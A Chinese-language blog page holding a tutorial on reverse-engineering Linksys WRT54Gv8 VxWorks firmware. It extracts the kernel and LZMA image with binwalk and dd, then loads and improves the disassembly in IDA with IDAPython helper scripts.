<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.8.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="have a nice day">
<meta property="og:url" content="http://21guns.top/page/7/index.html">
<meta property="og:site_name" content="have a nice day">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="have a nice day">

<link rel="canonical" href="http://21guns.top/page/7/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>have a nice day</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">have a nice day</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/07/03/iot/IDAPython-VxWorks固件解析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/03/iot/IDAPython-VxWorks固件解析/" class="post-title-link" itemprop="url">IDAPython-VxWorks固件解析</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-03 14:41:33" itemprop="dateCreated datePublished" datetime="2021-07-03T14:41:33+08:00">2021-07-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-04 16:24:57" itemprop="dateModified" datetime="2022-03-04T16:24:57+08:00">2022-03-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="IDAPython-VxWorks固件解析"><a href="#IDAPython-VxWorks固件解析" class="headerlink" title="IDAPython-VxWorks固件解析"></a>IDAPython-VxWorks固件解析</h1><h2 id="00-准备"><a href="#00-准备" class="headerlink" title="00-准备"></a>00-准备</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The WRT54G series infamously switched from Linux to VxWorks with the release of the WRT54Gv5. Because VxWorks is a proprietary RTOS, it is a less familiar environment than a Linux based system. Even once you identify the different sections of the firmware image, there usually isn’t a standard file system full of standard ELF executables that can be automatically analyzed by a disassembler.</span><br><span class="line"></span><br><span class="line"><span class="comment"># WRT54G从v5起，从Linux转为VxWorks</span></span><br><span class="line"><span class="comment"># vw是一个实时操作系统，不同于Linux，更加陌生</span></span><br><span class="line"><span class="comment"># 即使从固件中分辨出了不同的section，也很难获取到通用的文件系统（如squashFs）</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>固件：<a href="https://www.linksys.com/gb/support-article?articleNum=208638" target="_blank" rel="noopener">https://www.linksys.com/gb/support-article?articleNum=208638</a> 中的 <a href="https://downloads.linksys.com/downloads/firmware/FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin" target="_blank" rel="noopener">https://downloads.linksys.com/downloads/firmware/FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin</a></p>
</li>
<li><p>一般步骤</p>
<ol>
<li>从firmware中发现并提取出可执行代码</li>
<li>识别可执行代码的加载地址</li>
<li>指定加载地址，ida中打开</li>
<li>手动或脚本方式，增强ida的自动分析</li>
</ol>
</li>
<li><p>通过JTAG或者串口的debug信息可以替代1/2，但要有实机，在此纯分析firmware</p>
</li>
</ul>
<h2 id="01-固件组成"><a href="#01-固件组成" class="headerlink" title="01-固件组成"></a>01-固件组成</h2><ul>
<li>binwalk</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 仅留涉及到的</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk -v  FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin</span><br><span class="line"><span class="comment"># -v仅仅多了如下，没啥用</span></span><br><span class="line">Scan Time:     2021-01-07 15:52:34</span><br><span class="line">Target File:   /home/lxl/Desktop/tmp/FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin</span><br><span class="line">MD5 Checksum:  74317a70160f80fa5df01de0e479a39c</span><br><span class="line">Signatures:    344</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             BIN-Header, board ID: 5VGW, hardware version: 4702, firmware version: 1.128.128, build date: 2009-10-05</span><br><span class="line"><span class="comment"># ELF</span></span><br><span class="line">512           0x200           ELF, 32-bit LSB MIPS-II executable, MIPS, version 1 (SYSV)</span><br><span class="line"><span class="comment"># LZMA</span></span><br><span class="line">103664        0x194F0         LZMA compressed data, properties: 0x6C, dictionary size: 8388608 bytes, uncompressed size: 3680864 bytes</span><br><span class="line"><span class="comment"># gzip后的web文件</span></span><br><span class="line">1185153       0x121581        gzip compressed data, has original file name: <span class="string">"apply.htm"</span>, from NTFS filesystem (NT), last modified: 2009-09-04 07:45:58</span><br></pre></td></tr></table></figure>
<h3 id="1-web文件"><a href="#1-web文件" class="headerlink" title="1-web文件"></a>1-web文件</h3><ul>
<li>web文件的提取类似于之前的OW，<a href="http://www.devttys0.com/2011/06/mystery-file-system/，非本文重点" target="_blank" rel="noopener">http://www.devttys0.com/2011/06/mystery-file-system/，非本文重点</a></li>
</ul>
<h3 id="2-lama-data-主程序"><a href="#2-lama-data-主程序" class="headerlink" title="2-lama_data/主程序"></a>2-lama_data/主程序</h3><ul>
<li>dd提取lzma，7zip解压</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 大小转换（大约值，只保留商，足矣了</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ expr 3680864 / 1024 / 1024</span><br><span class="line">3</span><br><span class="line"><span class="comment"># lzma的uncompressed size: 3680864 bytes，大约3M，合理的大小，若太大（如几百M），则认为识别错了</span></span><br><span class="line">103664        0x194F0         LZMA compressed data, properties: 0x6C, dictionary size: 8388608 bytes, uncompressed size: 3680864 bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不用count，lzma解压时尾部的垃圾数据会忽略</span></span><br><span class="line"><span class="comment"># 要么就count=`expr 1173205 - 103664`，精确控制大小（但没必要</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin of=lzma_data.lzma bs=1 skip=103664</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux下的p7zip和lzma都不靠谱（二者还需要特定的后缀）</span></span><br><span class="line"><span class="comment"># 直接win下的7zip即可解压，会提示“有效数据外包含额外数据”，但结果不影响</span></span><br></pre></td></tr></table></figure>
<ul>
<li>strings或hexdump找敏感字符串</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/tmp$ strings lzma_data &gt; 1.txt</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ subl 1.txt</span><br><span class="line"><span class="variable">$MODEL_NAME</span>=WRT54G<span class="comment"># 型号</span></span><br><span class="line"><span class="variable">$OEM_NAME</span>=LINKSYS<span class="comment"># 厂商</span></span><br><span class="line">Content-Length: XXXXXXXX</span><br><span class="line">HTTP/1.1 307 Temporary Redirect<span class="comment"># HTTP</span></span><br><span class="line">Content-Type: text/html</span><br><span class="line">Location: https://%s%s/HNAP1/<span class="comment"># HNAP</span></span><br></pre></td></tr></table></figure>
<h3 id="3-kernel文件"><a href="#3-kernel文件" class="headerlink" title="3-kernel文件"></a>3-kernel文件</h3><ul>
<li>提取ELF可执行代码</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># firmware中的二进制数据中，可能会有可执行代码，要想分析，需要知道其CPU架构（指令集）及大小端等信息</span></span><br><span class="line"><span class="comment"># 有个ELF：mips、小端</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin | head</span><br><span class="line">512           0x200           ELF, 32-bit LSB MIPS-II executable, MIPS, version 1 (SYSV)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dd提取并file</span></span><br><span class="line"><span class="comment"># 未指定count，file也能看出来，故其依据的是头部信息，尾巴跟着啥无所谓</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=FW_WRT54Gv8_8.00.8.001_US_20091005,0.bin of=elf bs=1 skip=512</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ file elf </span><br><span class="line">elf: ELF 32-bit LSB executable, MIPS, MIPS-II version 1 (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure>
<ul>
<li>鉴别ELF是啥？内核文件</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># strings + head</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ strings -n 10 elf | head</span><br><span class="line">VxWorks5.4.2 <span class="comment"># vxworks</span></span><br><span class="line">Oct  5 2009, 15:15:53</span><br><span class="line">memPartFree</span><br><span class="line">bug <span class="keyword">in</span> vfprintf: bad base</span><br><span class="line">WIND version 2.5<span class="comment"># wind river</span></span><br><span class="line">workQPanic: Kernel work queue overflow.<span class="comment"># kernel</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 综上，mips、小端、字符串信息</span></span><br><span class="line"><span class="comment"># 此elf可能为VxWorks的kernel文件</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ida加载kernel</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选择mips little endian：能加载成功，还识别出了612个函数，所以dd时没指定count，尾部的数据是真的不影响</span></span><br><span class="line"><span class="comment"># Because this image has an ELF header, IDA's auto analysis does a very good job of identifying functions and resolving symbols for us. （所以如果没有头，是不是就没啥自动分析，如笔记13中的36ac，没有头，所以一打开啥也没有</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动分析后，第一个subroutine为startInflate（inflate-膨胀，依据名字，解压等操作？</span></span><br><span class="line"><span class="comment"># 0x80001000 给 v0、a1，调用完decompressImage后，jalr到v0</span></span><br><span class="line"><span class="comment"># 故0x80001000处存放了解压后的代码，decompressImage后，接管pc</span></span><br><span class="line"></span><br><span class="line">.text:80500460  <span class="comment"># =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:80500460                 .globl startInflate</span><br><span class="line">.text:80500460 startInflate:</span><br><span class="line">.text:80500464                 li      <span class="variable">$v0</span>, 0x80001000</span><br><span class="line">.text:8050046C                 li      <span class="variable">$a1</span>, 0x80001000</span><br><span class="line">.text:80500474                 li      <span class="variable">$a0</span>, _binArrayStart</span><br><span class="line">.text:8050048C                 jal     decompressImage</span><br><span class="line">.text:805004A0                 jalr    <span class="variable">$v0</span></span><br><span class="line">.text:805004B0  <span class="comment"># End of function startInflate</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># _binArrayStart是decompressImage的参数，待解压文件的开头？</span></span><br><span class="line">.data:80519270 _binArrayStart: .byte 0x6C  <span class="comment"># l          # DATA XREF: startInflate+14↑o</span></span><br><span class="line">.data:80519271                 .byte    0</span><br><span class="line">.data:80519272                 .byte    0</span><br><span class="line">.data:80519273                 .byte 0x80</span><br><span class="line">.data:80519274                 .byte    0</span><br><span class="line">.data:80519275                 .byte 0x60  <span class="comment"># `</span></span><br><span class="line">.data:80519276                 .byte 0x2A  <span class="comment"># *</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 之前提取的、未解压的lzma数据，恰好匹配</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump -C lzma_data.lzma | head</span><br><span class="line">00000000  6c 00 00 80 00 60 2a 38  00 00 00 00 00 00 11 00  |l....`*8........|</span><br><span class="line">00000010  2c 20 00 df 1e 01 d7 44  6b 43 41 4d a8 aa 91 9c  |, .....DkCAM....|</span><br><span class="line"></span><br><span class="line"><span class="comment"># decompressImage里调用了LzmaDecode</span></span><br><span class="line">.text:80500058                 .globl decompressImage</span><br><span class="line">.text:80500058 decompressImage:                         <span class="comment"># CODE XREF: startInflate+2C↓p</span></span><br><span class="line">.text:805001F8                 jal     LzmaDecode</span><br><span class="line">.text:80500224  <span class="comment"># End of function decompressImage</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 综上，代码做了：lzma_data.lzma传入decompressImage，解压后放在0x80001000</span></span><br><span class="line"><span class="comment"># 可人工代替：dd提取出lzma_data.lzma、7zip解压得到原始的lzma_data（其内包含可执行代码）、ida中打开并指定加载地址为0x80001000</span></span><br></pre></td></tr></table></figure>
<h2 id="02-ida加载主程序"><a href="#02-ida加载主程序" class="headerlink" title="02-ida加载主程序"></a>02-ida加载主程序</h2><ul>
<li>ida加载lzma_data</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载器只有最原始的：binary file</span></span><br><span class="line"><span class="comment"># processor选择mipsl（依据kernel文件，即elf</span></span><br><span class="line"><span class="comment"># 选中manual load，出现disassembly memory organization（或者不选，加载后就会默认打开</span></span><br><span class="line"><span class="comment"># 内存布局中：input file的loading address指定0x80001000、loading size默认就是文件大小、file offset默认0即可</span></span><br><span class="line"><span class="comment"># 选择创建rom section，address和size同input file（作用未知，但ram和rom必须选一个</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 刚打开，啥也没有，第一个字节处，快捷键c将byte转化为code，随后ida会自动分析</span></span><br><span class="line"><span class="comment"># 识别出了5769个函数，字符串识别也没问题</span></span><br><span class="line">ROM:80001000  <span class="comment"># Segment type: Pure code</span></span><br><span class="line">ROM:80001000                 .text <span class="comment"># ROM</span></span><br><span class="line"><span class="comment"># 首行代码，跳过随后的数据</span></span><br><span class="line">ROM:80001000                 b       loc_8000108C</span><br><span class="line"><span class="comment"># 这一块是数据，需要自己转</span></span><br><span class="line">ROM:80001004                 nop</span><br><span class="line">ROM:80001004  <span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line">ROM:80001008                 .byte    0</span><br><span class="line">ROM:80001009                 .byte    0</span><br><span class="line">ROM:8000100A                 .byte    0</span><br><span class="line">ROM:8000100B                 .byte    0</span><br><span class="line">ROM:8000100C                 .byte    0</span><br><span class="line">ROM:8000100D                 .byte    0</span><br><span class="line">ROM:8000100E                 .byte    0</span><br><span class="line">ROM:8000100F                 .byte    0</span><br><span class="line">ROM:80001010                 .byte 0x4E  <span class="comment"># N</span></span><br><span class="line">ROM:80001011                 .byte 0x4F  <span class="comment"># O</span></span><br><span class="line">ROM:80001012                 .byte 0x52  <span class="comment"># R</span></span><br><span class="line">......</span><br><span class="line"><span class="comment"># 其他位置代码也出来了</span></span><br><span class="line">ROM:8000108C  <span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line">ROM:8000108C</span><br><span class="line">ROM:8000108C loc_8000108C:                            <span class="comment"># CODE XREF: ROM:80001000↑j</span></span><br><span class="line">ROM:8000108C                 li      <span class="variable">$gp</span>, 0x8038BA50</span><br></pre></td></tr></table></figure>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071031.jpg" alt="image-20210108105021281"></p>
<ul>
<li>ida脚本加强其自动分析</li>
</ul>
<h2 id="03-ida脚本辅助"><a href="#03-ida脚本辅助" class="headerlink" title="03-ida脚本辅助"></a>03-ida脚本辅助</h2><p><a href="http://www.devttys0.com/wp-content/uploads/2011/07/ida_scripts.zip" target="_blank" rel="noopener">http://www.devttys0.com/wp-content/uploads/2011/07/ida_scripts.zip</a></p>
<h3 id="1-create-function-py"><a href="#1-create-function-py" class="headerlink" title="1-create_function.py"></a>1-create_function.py</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 遍历代码，查找函数序言来定位未标识的函数，如果找到一个，告诉IDA在那里创建一个函数</span></span><br><span class="line"><span class="comment"># MIPS比Intel要复杂一些，因为函数序言在MIPS中没有那么标准化</span></span><br><span class="line"><span class="comment"># addui指令用于操作函数开头的堆栈寄存器（$sp），如</span></span><br><span class="line">ROM:802DAE08 sub_802DAE08:                            <span class="comment"># CODE XREF: sub_802C81E0+64↑p</span></span><br><span class="line">ROM:802DAE08                 addiu   <span class="variable">$sp</span>, -0x68</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也有许多特殊的：addiu前有lw</span></span><br><span class="line">ROM:80002254 sub_80002254:                            <span class="comment"># CODE XREF: sub_800022D8:loc_80002320↓p</span></span><br><span class="line">ROM:80002254                 lw      <span class="variable">$v0</span>, dword_8034F218</span><br><span class="line">ROM:8000225C                 addiu   <span class="variable">$sp</span>, -0x18</span><br><span class="line"></span><br><span class="line"><span class="comment"># create_functions.py的IDAPython脚本将在代码（从光标位置开始）中搜索与这些指令对应的字节序列，并指示IDA将它们转换为函数。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在反汇编中，包含字符串的数据部分似乎从0x802DDAC0开始，因此将其设为停止地址</span></span><br><span class="line">ROM:802DDAB4  <span class="comment"># End of function sub_802DDA64</span></span><br><span class="line">ROM:802DDAB4  <span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line">ROM:802DDAB8                 .word 0</span><br><span class="line">ROM:802DDABC                 .word 0</span><br><span class="line">ROM:802DDAC0 aInvalidConfigu:.ascii <span class="string">"Invalid configuration. PCI_MAX_DEV &gt; 16, PCI mechanism #2\n"</span>&lt;0&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者直接拉到最后，找最后的地址</span></span><br><span class="line">ROM:80383A5E                 .byte    0</span><br><span class="line">ROM:80383A5F                 .byte    0</span><br><span class="line">ROM:80383A5F</span><br><span class="line">ROM:80383A5F                  <span class="comment"># end</span></span><br></pre></td></tr></table></figure>
<p>运行脚本前</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071029.jpg" alt="image-20210108160141284"></p>
<p>运行后，效果可观</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071030.jpg" alt="image-20210108160344144"></p>
<h3 id="2-create-code-py"><a href="#2-create-code-py" class="headerlink" title="2-create_code.py"></a>2-create_code.py</h3><p>仍有许多二进制没有被解析（颜色也对应）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071027.jpg" alt="image-20210108160934209"></p>
<p>这些部分被code周围是代码（从导航带中可见，蓝色中有些许棕色），手动c一下（或者p直接转为函数）便可将其转为代码</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071026.jpg" alt="image-20210108163928354"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这些代码都以“jr $ra”结尾（mips的return指令），并且看起来并没有被其他函数引用（比如jmp），因此可推断：是函数的本体</span></span><br><span class="line"><span class="comment"># create_code.py脚本：遍历数据，将未被引用的bytes转换为function</span></span><br><span class="line"><span class="comment"># （同之前的create_function有何区别？后者是unreferenced的，那前者是被引用的？被引用的就有addiu和lw指令？之间有啥联系？）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 效果可观：函数增加了、蓝色代码中的unexplored没有了、导航带右边unexplored出现了许多instruction</span></span><br></pre></td></tr></table></figure>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071033.jpg" alt="image-20210108164927529"></p>
<h3 id="3-create-ascii-py"><a href="#3-create-ascii-py" class="headerlink" title="3-create_ascii.py"></a>3-create_ascii.py</h3><ol>
<li><p>处理好代码后，仍有一些ASCII字节数组未被IDA转换为字符串，可手动a将其转换，或脚本处理</p>
</li>
<li><p>运行前</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-71030.jpg" alt="image-20210108165720911"></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071032.jpg" alt="image-20210111115337259"></p>
<p> 可见，无论字符串是什么形式（bytes or ascii），strings中都能识别</p>
</li>
<li><p>运行后，有的成功有的失败</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-11-071028.jpg" alt="image-20210111114350275"></p>
</li>
</ol>
